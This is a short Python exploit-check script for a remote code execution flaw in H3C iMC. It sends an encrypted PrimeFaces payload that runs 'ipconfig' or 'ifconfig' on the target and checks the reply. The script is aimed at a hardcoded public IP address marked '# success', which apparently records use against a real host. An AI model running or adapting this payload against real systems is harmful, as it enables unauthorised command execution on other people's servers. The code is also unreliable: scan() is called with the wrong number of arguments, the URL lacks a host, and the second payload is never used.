# -*- coding:utf-8 -*-

import sys;sys.path.append("../")
import requests
from lib.io import MyPrint



def scan(domain, ip, port):

    url = domain + "/imc/javax.faces.resource/dynamiccontent.properties.xhtml"

    leakName = "h3c_imc_rce"
    data1 = {
        'pfdrt': 'sc',
        'ln': 'primefaces',
        'pfdrid': 'uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV/KAe9gtw54DSQCl72JjEAsHTRvxAuJC+/IFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf/cNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv+Eo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c+GvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy+ZLezLj6vK+pVFyKR7s8xN5Ol1tz/G0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM/cwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16/I7eog15OBl4Kco/VjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH+N7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO+Eb/60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF/ciVuZGssKeVT/gR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx/qFUj+DikXHLvbUMrMlNAqSFJpqoy/QywVdBmlVdx+vJelZEK+BwNF9J4p/1fQ8wJZL2LB9SnqxAKr5kdCs0H/vouGHAXJZ+Jzx5gcCw5h6/p3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D/ukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd+LylDFB3dcYIgZtZoaSMAV3pyNoOzHy+1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3+9h0aurkyJVR28jIQlF4nT0nZqpixP/nc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl+zoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH+OwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE+lsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU=',
        'cmd': 'ipconfig'
    }
    data2 = {
        'pfdrt': 'sc',
        'ln': 'primefaces',
        'pfdrid': 'uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV/KAe9gtw54DSQCl72JjEAsHTRvxAuJC+/IFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf/cNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv+Eo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c+GvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy+ZLezLj6vK+pVFyKR7s8xN5Ol1tz/G0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM/cwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16/I7eog15OBl4Kco/VjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH+N7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO+Eb/60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF/ciVuZGssKeVT/gR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx/qFUj+DikXHLvbUMrMlNAqSFJpqoy/QywVdBmlVdx+vJelZEK+BwNF9J4p/1fQ8wJZL2LB9SnqxAKr5kdCs0H/vouGHAXJZ+Jzx5gcCw5h6/p3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D/ukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd+LylDFB3dcYIgZtZoaSMAV3pyNoOzHy+1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3+9h0aurkyJVR28jIQlF4nT0nZqpixP/nc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl+zoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH+OwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE+lsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU=',
        'cmd': 'ifconfig'
    }

    try:
        r = requests.post(url, data=data1)

    except Exception as e:
        MyPrint(-1, leakName)
        pass
    else:
        if r.status_code == 200 and "Windows IP" in r.text:
            MyPrint(1, leakName)

        else:
            MyPrint(0, leakName)


if __name__ == "__main__":

    scan("http", "124.235.224.178", "124.235.224.178", "8080")  # success


